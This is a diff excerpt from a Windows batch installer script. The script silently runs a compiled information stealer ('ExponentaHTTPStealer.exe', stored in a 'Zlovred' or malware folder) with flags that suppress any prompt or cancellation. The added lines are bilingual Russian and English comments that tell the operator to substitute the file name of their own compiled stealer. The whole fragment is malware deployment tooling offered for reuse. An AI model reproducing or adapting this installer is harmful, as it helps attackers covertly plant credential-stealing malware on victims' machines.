@@ -58,6 +58,8 @@ rem Insatall MainExponenta Files...
 cd /d %curdir%
 
 echo "Installing Stealer..."
+rem Поменять на имя своего файла скомпилированного стайлера (вместо ExponentaHTTPStealer.exe !!!)
+rem Change the name of Stealer compiled file (Instaed of ExponentaHTTPStealer.exe)
 %Dest_DIR%\Distrib\Zlovred\ExponentaHTTPStealer.exe /VERYSILENT /NOCANCEL
 
 rem Refresh Environment
